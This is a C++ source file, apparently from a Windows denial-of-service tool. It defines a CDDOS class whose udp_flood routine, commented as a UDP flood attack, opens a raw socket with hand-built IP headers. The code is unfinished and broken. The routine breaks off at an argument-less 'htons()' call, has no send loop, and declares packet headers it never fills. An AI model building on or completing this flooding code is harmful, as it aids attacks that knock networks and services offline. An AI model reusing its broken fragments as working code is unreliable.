// DDOS.cpp: implementation of the CDDOS class.
//
//////////////////////////////////////////////////////////////////////

#include "DDOS.h"
#include <iostream.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDDOS::CDDOS()		//构造函数
{

}
void CDDOS::fill_udp_buffer()
{
	WSADATA wsaData;
	//初始化socket.dll
	WSAStartup(MAKEWORD(2, 2),&wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];			//主机名
	gethostname(hostname,MAX_PATH);			//获得主机名
	LPHOSTENT lphost;

	//通过主机名获得主机的详细信息
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
	{

		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;


	}
	char pBuffer[BufferSize];		//声明一个1024字节的缓冲区
	IP_HEADER ipHeader;			//IP头
	UDP_HEADER udpHeader;		//UDP头
	int iUdpCheckSumSize;
	char *ptr = NULL;
	FillMemory(pBuffer,nBufferSize,'A');		//将pBuffer填充为A
	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + nBufferSize;
}
void CDDOS::udp_flood()
{
/************************************************************************/
/* UDP洪水攻击															*/
/************************************************************************/

	//暂停当前进程，延时两秒
	Sleep(2000);
	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2),&wsaData);
	
	SOCKET SendSocket;
	BOOL Flag;
	//创建一个与指定传送服务捆绑的套接字，调用失败则返回
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if ( SendSocket == INVALID_SOCKET )
	{


		return;


	}
	Flag = true;
	//设置套接字选项值
	if (setsockopt(SendSocket,IPPROTO_UDP,IP_HDRINCL,(CHAR *)&Flag,sizeof(Flag))  == SOCKET_ERROR )
	{


		//设置套接字选项值有错误发生
		cout<<"setsockopt Error!\n"<<endl;
		return;

	}
	SOCKADDR_IN addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons()

}


CDDOS::~CDDOS()		//析构函数
{

}
